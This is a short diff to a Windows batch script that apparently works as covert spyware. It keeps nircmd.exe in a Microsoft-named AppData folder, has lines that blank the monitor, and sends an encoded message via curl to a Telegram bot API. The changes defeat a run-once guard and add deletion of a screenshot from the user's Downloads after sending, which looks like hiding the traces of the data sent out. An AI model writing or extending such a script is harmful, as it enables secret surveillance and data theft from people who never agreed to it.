@@ -1,13 +1,13 @@
 @echo off
 
-
+del /f /q "%temp%\run_once.flag"
 
 :: Run Once
 if exist "%temp%\run_once.flag" goto skip_code
 
 
-"%APPDATA%\Microsoft\nircmd.exe" monitor off
-echo 1 > "%temp%\run_once.flag"
+:: "%APPDATA%\Microsoft\nircmd.exe" monitor off
+:: echo 1 > "%temp%\run_once.flag"
 
 :skip_code
 
@@ -56,7 +56,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
      -d "text=%ENCODED_MESSAGE%"
 
 
-
+del /f /q "%USERPROFILE%\Downloads\screenshot.png"
 
 echo.
 echo.
